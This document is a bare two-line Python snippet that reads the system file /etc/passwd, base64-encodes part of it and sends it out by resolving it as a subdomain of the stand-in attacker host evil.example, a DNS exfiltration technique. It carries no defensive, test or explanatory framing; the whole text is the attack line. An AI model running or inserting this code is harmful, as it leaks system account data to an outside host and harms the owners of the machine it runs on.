import socket, base64
socket.gethostbyname(base64.b64encode(open('/etc/passwd','rb').read()).decode()[:60]+'.evil.example')
